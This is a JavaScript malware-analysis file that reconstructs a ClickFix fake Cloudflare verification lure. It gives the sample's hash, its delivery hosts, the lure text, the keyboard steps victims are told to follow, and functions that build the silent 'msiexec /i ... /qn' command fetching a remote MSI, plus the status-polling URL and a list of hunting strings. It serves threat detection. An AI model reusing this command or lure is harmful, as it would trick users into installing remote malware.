/*
 * Adventures of Derp
 *
 * ClickFix fake Cloudflare verification, VM-obfuscated JavaScript.
 * Devirtualized behavioral reconstruction from the captured sample.
 *
 * Captured: 2026-08-23
 * Raw JavaScript size: 264403 bytes
 * Raw JavaScript SHA256:
 *   91f6a9f136018cf3fbae990c2f3f4a77db4eaff522bdbca9348c25c6a1bf67e7
 *
 * The original sample is protected by a large custom JavaScript bytecode VM.
 * The useful behavior recovered from that VM is preserved below in readable
 * form. This file does not automatically execute the copied command.
 *
 * Delivery:
 *   Fake Cloudflare verification page
 *   -> user clicks "Verify you are human"
 *   -> lure instructs Win+X, I, Ctrl+V, Enter
 *   -> clipboard contains a silent msiexec command
 *   -> MSI fetched from cloudfrontenterprise.com/get/my?sid=<sid>
 *   -> page polls cloudfrontenterprise.com/js-status for execution state
 *
 * Related UI/asset infrastructure observed in the sample:
 *   gettrumpmemes.gettrumpmemestrendingtokens.com
 */

const sample = Object.freeze({
  family: "ClickFix",
  lure: "Fake Cloudflare verification",
  execution: "msiexec",
  payloadType: "MSI",

  raw: Object.freeze({
    size: 264403,
    sha256: "91f6a9f136018cf3fbae990c2f3f4a77db4eaff522bdbca9348c25c6a1bf67e7",
    vmGlobal: "vmP_340ad0",
    vmEntry: "vmv_f77f8b",
  }),

  infrastructure: Object.freeze({
    deliveryHost: "cloudfrontenterprise.com",
    assetHost: "gettrumpmemes.gettrumpmemestrendingtokens.com",
    payloadPath: "/get/my",
    statusPath: "/js-status",
  }),

  storage: Object.freeze({
    localStorageKey: "iframeShown",
    sessionStorageKey: "iframeShown",
  }),

  lureText: Object.freeze([
    "Verify you are human",
    "Additional Verification Required",
  ]),

  userSteps: Object.freeze([
    "Press Win + X",
    "Press I to open Terminal",
    "Press Ctrl + V",
    "Press Enter",
  ]),
});

/*
 * The VM generates a per-visit identifier and embeds it into the MSI URL.
 * One instrumented execution produced:
 *
 *   1787484319691-khzqzzba
 *
 * The exact identifier is not stable, so detection should focus on the host,
 * path and msiexec syntax rather than a particular sid value.
 */
function buildObservedCommand(sid) {
  return `msiexec /i "https://${sample.infrastructure.deliveryHost}${sample.infrastructure.payloadPath}?sid=${encodeURIComponent(sid)}" /qn`;
}

/*
 * The page also polls the same host after the clipboard stage. The callback
 * name is generated from the visit identifier.
 *
 * Observed shape:
 *   https://cloudfrontenterprise.com/js-status
 *     ?callback=handleCmdCheck_<sid>
 *     &sid=<sid>
 *     &id=<id>
 */
function buildObservedStatusUrl(sid, id = sid) {
  const base = `https://${sample.infrastructure.deliveryHost}${sample.infrastructure.statusPath}`;
  const params = new URLSearchParams({
    callback: `handleCmdCheck_${sid}`,
    sid,
    id,
  });
  return `${base}?${params.toString()}`;
}

/*
 * Recovered control flow, expressed without wiring it to DOM events or the
 * clipboard. The live VM performs these operations after the fake challenge
 * is rendered and the user interacts with it.
 */
function recoveredClickFixFlow(sid) {
  return Object.freeze({
    gate: {
      localStorage: `${sample.storage.localStorageKey}=true`,
      sessionStorage: `${sample.storage.sessionStorageKey}=true`,
    },
    commandCopiedToClipboard: buildObservedCommand(sid),
    statusPoll: buildObservedStatusUrl(sid),
    instructions: sample.userSteps,
  });
}

/*
 * High-value hunting strings from the devirtualized behavior:
 *
 *   cloudfrontenterprise.com
 *   /get/my?sid=
 *   /js-status
 *   handleCmdCheck_
 *   iframeShown
 *   Additional Verification Required
 *   msiexec /i
 *   /qn
 *
 * The original blob also exposes normal browser globals through the VM,
 * including document, navigator, localStorage, sessionStorage, fetch,
 * setTimeout, setInterval, URLSearchParams and CustomEvent.
 */

void sample;
void recoveredClickFixFlow;
